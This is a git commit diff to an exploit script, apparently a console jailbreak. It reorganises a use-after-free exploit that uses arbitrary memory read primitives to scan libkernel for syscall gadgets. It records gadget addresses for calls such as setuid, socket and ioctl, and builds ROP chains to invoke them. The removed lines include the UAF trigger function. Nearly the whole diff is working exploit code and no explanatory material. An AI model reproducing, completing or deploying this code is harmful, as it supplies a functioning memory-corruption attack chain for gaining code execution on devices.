74972be6c7dc3a8b31b9bc7edbac211a0b9af07f
earthonion <garlic@duck.com>
2025-12-29 19:57:45 -0500

    organized constants and helper functions, added some for poopsploit. cleaned up syscall logic

--- src/inject.js
+++ src/inject.js
@@ -1,379 +1,7 @@
-class BigInt {
-  /**
-   * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
-   */
-  constructor () {
-    this.buf = new ArrayBuffer(8)
-    this.i8 = new Int8Array(this.buf)
-    this.u8 = new Uint8Array(this.buf)
-    this.i16 = new Int16Array(this.buf)
-    this.u16 = new Uint16Array(this.buf)
-    this.i32 = new Int32Array(this.buf)
-    this.u32 = new Uint32Array(this.buf)
-    this.f32 = new Float32Array(this.buf)
-    this.f64 = new Float64Array(this.buf)
+include('util.js')
+include('globals.js')
 
-    switch (arguments.length) {
-      case 0:
-        break
-      case 1:
-        var val = arguments[0]
-        switch (typeof val) {
-          case 'boolean':
-            this.u8[0] = (val === true) | 0
-            break
-          case 'number':
-            if (Number.isNaN(val)) {
-              throw new TypeError(`value ${val} is NaN`)
-            }
-
-            this.f64[0] = val
-
-            break
-          case 'string':
-            if (val.startsWith('0x')) {
-              val = val.slice(2)
-            }
-
-            if (val.length > this.u8.length * 2) {
-              throw new RangeError(`value ${val} is out of range !!`)
-            }
-
-            while (val.length < this.u8.length * 2) {
-              val = '0' + val
-            }
-
-            for (var i = 0; i < this.u8.length; i++) {
-              var start = val.length - 2 * (i + 1)
-              var end = val.length - 2 * i
-              var b = val.slice(start, end)
-              this.u8[i] = parseInt(b, 16)
-            }
-
-            break
-          case 'object':
-            if (val instanceof BigInt) {
-              this.u8.set(val.u8)
-              break
-            } else {
-              var prop = BigInt.TYPE_MAP[val.constructor.name]
-              if (prop in this) {
-                var arr = this[prop]
-                if (val.length !== arr.length) {
-                  throw new Error(
-                    `Array length mismatch, expected ${arr.length} got ${val.length}.`
-                  )
-                }
-
-                arr.set(val)
-                break
-              }
-            }
-          default:
-            throw new TypeError(`Unsupported value ${val} !!`)
-        }
-        break
-      case 2:
-        var hi = arguments[0]
-        var lo = arguments[1]
-
-        if (!Number.isInteger(hi)) {
-          throw new RangeError(`hi value ${hi} is not an integer !!`)
-        }
-
-        if (!Number.isInteger(lo)) {
-          throw new RangeError(`lo value ${lo} is not an integer !!`)
-        }
-
-        this.u32[0] = lo
-        this.u32[1] = hi
-        break
-      default:
-        throw new TypeError('Unsupported input !!')
-    }
-  }
-
-  toString () {
-    var val = '0x'
-    for (var i = this.u8.length - 1; i >= 0; i--) {
-      var c = this.u8[i].toString(16).toUpperCase()
-      val += c.length === 1 ? '0' + c : c
-    }
-    return val
-  }
-
-  endian () {
-    for (var i = 0; i < this.u8.length / 2; i++) {
-      var b = this.u8[i]
-      this.u8[i] = this.u8[this.u8.length - 1 - i]
-      this.u8[this.u8.length - 1 - i] = b
-    }
-  }
-
-  lo () {
-    return this.u32[0]
-  }
-
-  hi () {
-    return this.u32[1]
-  }
-
-  d () {
-    if (this.u8[7] === 0xFF && (this.u8[6] === 0xFF || this.u8[6] === 0xFE)) {
-      throw new RangeError('Integer value cannot be represented by a double')
-    }
-
-    return this.f64[0]
-  }
-
-  jsv () {
-    if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xFF && this.u8[6] === 0xFF)) {
-      throw new RangeError('Integer value cannot be represented by a JSValue')
-    }
-
-    return this.sub(new BigInt(0x10000, 0))
-  }
-
-  cmp (val) {
-    if (this.hi() > val.hi()) {
-      return 1
-    }
-
-    if (this.hi() < val.hi()) {
-      return -1
-    }
-
-    if (this.lo() > val.lo()) {
-      return 1
-    }
-
-    if (this.lo() < val.lo()) {
-      return -1
-    }
-
-    return 0
-  }
-
-  eq (val) {
-    return this.hi() === val.hi() && this.lo() === val.lo()
-  }
-
-  neq (val) {
-    return this.hi() !== val.hi() || this.lo() !== val.lo()
-  }
-
-  gt (val) {
-    return this.cmp(val) > 0
-  }
-
-  gte (val) {
-    return this.cmp(val) >= 0
-  }
-
-  lt (val) {
-    return this.cmp(val) < 0
-  }
-
-  lte (val) {
-    return this.cmp(val) <= 0
-  }
-
-  add (val) {
-    var ret = new BigInt()
-
-    var c = 0
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      var b = this.u8[i] + val.u8[i] + c
-      c = (b > 0xFF) | 0
-      ret.u8[i] = b
-    }
-
-    return ret
-  }
-
-  sub (val) {
-    var ret = new BigInt()
-
-    var c = 0
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      var b = this.u8[i] - val.u8[i] - c
-      c = (b < 0) | 0
-      ret.u8[i] = b
-    }
-
-    return ret
-  }
-
-  mul (val) {
-    var ret = new BigInt()
-
-    var c = 0
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      var s = c
-      for (var j = 0; j <= i; j++) {
-        s += this.u8[j] * (val.u8[i - j] || 0)
-      }
-
-      ret.u8[i] = s & 0xFF
-      c = s >>> 8
-    }
-
-    if (c !== 0) {
-      throw new Error('mul overflowed !!')
-    }
-
-    return ret
-  }
-
-  divmod (val) {
-    if (!val.gte(BigInt.Zero)) {
-      throw new Error('Division by zero')
-    }
-
-    var q = new BigInt()
-    var r = new BigInt()
-
-    for (var b = (this.buf.byteLength * 8) - 1; b >= 0; b--) {
-      r = r.shl(1)
-
-      var byte_idx = Math.floor(b / 8)
-      var bit_idx = b % 8
-
-      r.u8[0] |= (this.u8[byte_idx] >> bit_idx) & 1
-
-      if (r.gte(val)) {
-        r = r.sub(val)
-
-        q.u8[byte_idx] |= 1 << bit_idx
-      }
-    }
-
-    return { q, r }
-  }
-
-  div (val) {
-    return this.divmod(val).q
-  }
-
-  mod (val) {
-    return this.divmod(val).r
-  }
-
-  xor (val) {
-    var ret = new BigInt()
-
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      ret.u8[i] = this.u8[i] ^ val.u8[i]
-    }
-
-    return ret
-  }
-
-  and (val) {
-    var ret = new BigInt()
-
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      ret.u8[i] = this.u8[i] & val.u8[i]
-    }
-
-    return ret
-  }
-
-  or (val) {
-    var ret = new BigInt()
-
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      ret.u8[i] = this.u8[i] | val.u8[i]
-    }
-
-    return ret
-  }
-
-  neg () {
-    var ret = new BigInt()
-
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      ret.u8[i] = ~this.u8[i]
-    }
-
-    return ret.and(BigInt.One)
-  }
-
-  shl (count) {
-    if (count < 0 || count > 64) {
-      throw new RangeError(`Shift ${count} bits out of range !!`)
-    }
-
-    var ret = new BigInt()
-
-    var byte_count = Math.floor(count / 8)
-    var bit_count = count % 8
-
-    for (var i = this.buf.byteLength - 1; i >= 0; i--) {
-      var t = i - byte_count
-      var b = t >= 0 ? this.u8[t] : 0
-
-      if (bit_count) {
-        var p = t - 1 >= 0 ? this.u8[t - 1] : 0
-        b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF
-      }
-
-      ret.u8[i] = b
-    }
-
-    return ret
-  }
-
-  shr (count) {
-    if (count < 0 || count > 64) {
-      throw new RangeError(`Shift ${count} bits out of range !!`)
-    }
-
-    var ret = new BigInt()
-
-    var byte_count = Math.floor(count / 8)
-    var bit_count = count % 8
-
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      var t = i + byte_count
-      var b = t >= 0 ? this.u8[t] : 0
-
-      if (bit_count) {
-        var n = t + 1 >= 0 ? this.u8[t + 1] : 0
-        b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xff
-      }
-
-      ret.u8[i] = b
-    }
-
-    return ret
-  }
-}
-
-BigInt.Zero = new BigInt()
-BigInt.One = new BigInt(0, 1)
-BigInt.TYPE_MAP = {
-  Int8Array: 'i8',
-  Uint8Array: 'u8',
-  Int16Array: 'i16',
-  Uint16Array: 'u16',
-  Int32Array: 'i32',
-  Uint32Array: 'u32',
-  Float32Array: 'f32',
-  Float64Array: 'f64',
-}
-
-var allocs = new Map()
-
-function make_uaf (arr) {
-  var o = {}
-  for (var i in { xx: '' }) {
-    for (i of [arr]);
-    o[i]
-  }
-
-  gc()
-}
+// UAF exploit starts here
 
 // needed for rw primitives
 var prim_uaf_idx = -1
@@ -640,6 +268,7 @@ var gadgets = {
   MOV_RAX_RCX_RET: base_addr.add(new BigInt(0, 0x41015)),
   PUSH_RAX_POP_RBP_RET: base_addr.add(new BigInt(0, 0x4E82B9))
 }
+
 
 var rop = {
   idx: 0,
@@ -914,9 +543,10 @@ try {
     var base_lo = libkernel_base.lo()
     var base_hi = libkernel_base.hi()
     var chunk_data = new Array(chunk_size)
-    var found_addrs_lo = []
-    var found_addrs_hi = []
-    var found_syscalls = []
+    var found_addrs_lo = new Array(600)
+    var found_addrs_hi = new Array(600)
+    var found_syscalls = new Array(600)
+    var found_count = 0
 
     for (var chunk = 0; chunk < num_chunks; chunk++) {
       try {
@@ -933,10 +563,11 @@ try {
           chunk_data[c] = -1
         }
 
+        var read_lo, read_hi, low_dword, high_dword
         for (var q = 0; q < chunk_size; q += 8) {
           try {
-            var read_lo = addr_lo + q
-            var read_hi = addr_hi
+            read_lo = addr_lo + q
+            read_hi = addr_hi
             if (read_lo >= 0x100000000) {
               read_lo -= 0x100000000
               read_hi++
@@ -945,29 +576,35 @@ try {
             master[4] = read_lo
             master[5] = read_hi
 
-            var low_dword = slave[0]
-            var high_dword = slave[1]
+            low_dword = slave[0]
+            high_dword = slave[1]
 
-            if (q + 0 < chunk_size) chunk_data[q + 0] = low_dword & 0xFF
-            if (q + 1 < chunk_size) chunk_data[q + 1] = (low_dword >>> 8) & 0xFF
-            if (q + 2 < chunk_size) chunk_data[q + 2] = (low_dword >>> 16) & 0xFF
-            if (q + 3 < chunk_size) chunk_data[q + 3] = (low_dword >>> 24) & 0xFF
-            if (q + 4 < chunk_size) chunk_data[q + 4] = high_dword & 0xFF
-            if (q + 5 < chunk_size) chunk_data[q + 5] = (high_dword >>> 8) & 0xFF
-            if (q + 6 < chunk_size) chunk_data[q + 6] = (high_dword >>> 16) & 0xFF
-            if (q + 7 < chunk_size) chunk_data[q + 7] = (high_dword >>> 24) & 0xFF
+            chunk_data[q] = low_dword & 0xFF
+            chunk_data[q + 1] = (low_dword >>> 8) & 0xFF
+            chunk_data[q + 2] = (low_dword >>> 16) & 0xFF
+            chunk_data[q + 3] = (low_dword >>> 24) & 0xFF
+            chunk_data[q + 4] = high_dword & 0xFF
+            chunk_data[q + 5] = (high_dword >>> 8) & 0xFF
+            chunk_data[q + 6] = (high_dword >>> 16) & 0xFF
+            chunk_data[q + 7] = (high_dword >>> 24) & 0xFF
           } catch (e) {
-            for (var b = 0; b < 8 && (q + b) < chunk_size; b++) {
-              chunk_data[q + b] = -1
-            }
+            chunk_data[q] = -1
+            chunk_data[q + 1] = -1
+            chunk_data[q + 2] = -1
+            chunk_data[q + 3] = -1
+            chunk_data[q + 4] = -1
+            chunk_data[q + 5] = -1
+            chunk_data[q + 6] = -1
+            chunk_data[q + 7] = -1
           }
         }
 
+        var match, expected, syscall_num, gadget_offset, gadget_lo, gadget_hi
         for (var i = 0; i < chunk_size - pattern.length; i++) {
-          var match = true
+          match = true
 
           for (var p = 0; p < pattern.length; p++) {
-            var expected = pattern[p]
+            expected = pattern[p]
             if (expected !== -1) {
               if (chunk_data[i + p] === -1 || chunk_data[i + p] !== expected) {
                 match = false
@@ -977,23 +614,24 @@ try {
           }
 
           if (match) {
-            var syscall_num = (chunk_data[i + 3] & 0xFF) |
-                                         ((chunk_data[i + 4] & 0xFF) << 8) |
-                                         ((chunk_data[i + 5] & 0xFF) << 16) |
-                                         ((chunk_data[i + 6] & 0xFF) << 24)
+            syscall_num = (chunk_data[i + 3] & 0xFF) |
+                          ((chunk_data[i + 4] & 0xFF) << 8) |
+                          ((chunk_data[i + 5] & 0xFF) << 16) |
+                          ((chunk_data[i + 6] & 0xFF) << 24)
 
             if (syscall_num >= 0 && !syscall_gadgets[syscall_num]) {
-              var gadget_offset = chunk_offset + i
-              var gadget_lo = base_lo + gadget_offset
-              var gadget_hi = base_hi
+              gadget_offset = chunk_offset + i
+              gadget_lo = base_lo + gadget_offset
+              gadget_hi = base_hi
               if (gadget_lo >= 0x100000000) {
                 gadget_lo -= 0x100000000
                 gadget_hi++
               }
 
-              found_addrs_lo.push(gadget_lo)
-              found_addrs_hi.push(gadget_hi)
-              found_syscalls.push(syscall_num)
+              found_addrs_lo[found_count] = gadget_lo
+              found_addrs_hi[found_count] = gadget_hi
+              found_syscalls[found_count] = syscall_num
+              found_count++
               syscall_gadgets[syscall_num] = true
               matches_found++
             }
@@ -1007,35 +645,112 @@ try {
     log('')
     log('Found ' + matches_found + ' syscall gadgets')
 
-    for (var f = 0; f < found_syscalls.length; f++) {
-      var syscall_num = found_syscalls[f]
-      var gadget_addr = new BigInt(found_addrs_hi[f], found_addrs_lo[f])
-      syscall_gadgets[syscall_num] = gadget_addr
+    var kapi = {
+      read_lo: 0, read_hi: 0, read_found: false,
+      write_lo: 0, write_hi: 0, write_found: false,
+      close_lo: 0, close_hi: 0, close_found: false,
+      getpid_lo: 0, getpid_hi: 0, getpid_found: false,
+      setuid_lo: 0, setuid_hi: 0, setuid_found: false,
+      recvmsg_lo: 0, recvmsg_hi: 0, recvmsg_found: false,
+      pipe_lo: 0, pipe_hi: 0, pipe_found: false,
+      ioctl_lo: 0, ioctl_hi: 0, ioctl_found: false,
+      dup_lo: 0, dup_hi: 0, dup_found: false,
+      socket_lo: 0, socket_hi: 0, socket_found: false,
+      setsockopt_lo: 0, setsockopt_hi: 0, setsockopt_found: false,
+      getsockopt_lo: 0, getsockopt_hi: 0, getsockopt_found: false,
+      readv_lo: 0, readv_hi: 0, readv_found: false,
+      writev_lo: 0, writev_hi: 0, writev_found: false,
+      socketpair_lo: 0, socketpair_hi: 0, socketpair_found: false,
+      kqueue_lo: 0, kqueue_hi: 0, kqueue_found: false,
+      getuid_lo: 0, getuid_hi: 0, getuid_found: false
     }
 
-    var syscall_wrapper_addr = null
-    // eslint being dumb here
-    // eslint-disable-next-line no-unreachable-loop
-    for (var num in syscall_gadgets) {
-      var gadget_addr = syscall_gadgets[num]
-      syscall_wrapper_addr = gadget_addr.add(new BigInt(0, 10))
-      log('syscall_wrapper: ' + syscall_wrapper_addr.toString())
-      break
+    for (var f = 0; f < found_count; f++) {
+      var syscall_num = found_syscalls[f]
+      var lo = found_addrs_lo[f]
+      var hi = found_addrs_hi[f]
+
+      if (syscall_num === 0x03) {
+        kapi.read_lo = lo
+        kapi.read_hi = hi
+        kapi.read_found = true
+      } else if (syscall_num === 0x04) {
+        kapi.write_lo = lo
+        kapi.write_hi = hi
+        kapi.write_found = true
+      } else if (syscall_num === 0x06) {
+        kapi.close_lo = lo
+        kapi.close_hi = hi
+        kapi.close_found = true
+      } else if (syscall_num === 0x14) {
+        kapi.getpid_lo = lo
+        kapi.getpid_hi = hi
+        kapi.getpid_found = true
+      } else if (syscall_num === 0x17) {
+        kapi.setuid_lo = lo
+        kapi.setuid_hi = hi
+        kapi.setuid_found = true
+      } else if (syscall_num === 0x18) {
+        kapi.getuid_lo = lo
+        kapi.getuid_hi = hi
+        kapi.getuid_found = true
+      } else if (syscall_num === 0x1B) {
+        kapi.recvmsg_lo = lo
+        kapi.recvmsg_hi = hi
+        kapi.recvmsg_found = true
+      } else if (syscall_num === 0x29) {
+        kapi.dup_lo = lo
+        kapi.dup_hi = hi
+        kapi.dup_found = true
+      } else if (syscall_num === 0x2A) {
+        kapi.pipe_lo = lo
+        kapi.pipe_hi = hi
+        kapi.pipe_found = true
+      } else if (syscall_num === 0x36) {
+        kapi.ioctl_lo = lo
+        kapi.ioctl_hi = hi
+        kapi.ioctl_found = true
+      } else if (syscall_num === 0x61) {
+        kapi.socket_lo = lo
+        kapi.socket_hi = hi
+        kapi.socket_found = true
+      } else if (syscall_num === 0x69) {
+        kapi.setsockopt_lo = lo
+        kapi.setsockopt_hi = hi
+        kapi.setsockopt_found = true
+      } else if (syscall_num === 0x76) {
+        kapi.getsockopt_lo = lo
+        kapi.getsockopt_hi = hi
+        kapi.getsockopt_found = true
+      } else if (syscall_num === 0x78) {
+        kapi.readv_lo = lo
+        kapi.readv_hi = hi
+        kapi.readv_found = true
+      } else if (syscall_num === 0x79) {
+        kapi.writev_lo = lo
+        kapi.writev_hi = hi
+        kapi.writev_found = true
+      } else if (syscall_num === 0x88) {
+        kapi.socketpair_lo = lo
+        kapi.socketpair_hi = hi
+        kapi.socketpair_found = true
+      } else if (syscall_num === 0x16E) {
+        kapi.kqueue_lo = lo
+        kapi.kqueue_hi = hi
+        kapi.kqueue_found = true
+      }
     }
+
 
     // Test getuid syscall (0x18)
     log('')
     log('Testing getuid syscall...')
-    var getuid_wrapper = syscall_gadgets[0x18]
 
-    if (getuid_wrapper) {
+    if (kapi.getuid_found) {
       var test_store_addr = mem.malloc(0x10)
-      var test_insts = []
+      var getuid_wrapper = new BigInt(kapi.getuid_hi, kapi.getuid_lo)
+      var test_insts = build_rop_chain(getuid_wrapper)
 
-      // Call getuid wrapper (no arguments needed)
-      test_insts.push(getuid_wrapper)
-
-      // Store return value from RAX
       rop.store(test_insts, test_store_addr, 1)
 
       try {
@@ -1048,26 +763,18 @@ try {
         mem.free(test_store_addr)
       }
     } else {
-      log('WARNING: getuid wrapper not found in syscall_gadgets')
+      log('WARNING: getuid wrapper not found')
     }
 
     // Test dup syscall (0x29)
     log('')
     log('Testing dup syscall...')
-    var dup_wrapper = syscall_gadgets[0x29]
 
-    if (dup_wrapper) {
+    if (kapi.dup_found) {
       var dup_store_addr = mem.malloc(0x10)
-      var dup_insts = []
+      var dup_wrapper = new BigInt(kapi.dup_hi, kapi.dup_lo)
+      var dup_insts = build_rop_chain(dup_wrapper, new BigInt(0, 1))
 
-      // Set RDI = 1 (stdout file descriptor)
-      dup_insts.push(gadgets.POP_RDI_RET)
-      dup_insts.push(new BigInt(0, 1))
-
-      // Call dup wrapper
-      dup_insts.push(dup_wrapper)
-
-      // Store return value from RAX
       rop.store(dup_insts, dup_store_addr, 1)
 
       try {
@@ -1080,7 +787,7 @@ try {
         mem.free(dup_store_addr)
       }
     } else {
-      log('WARNING: dup wrapper not found in syscall_gadgets')
+      log('WARNING: dup wrapper not found')
     }
   } else {
     log('ERROR: sceKernelGetModuleInfoFromAddr failed with code: ' + ret_val.lo())
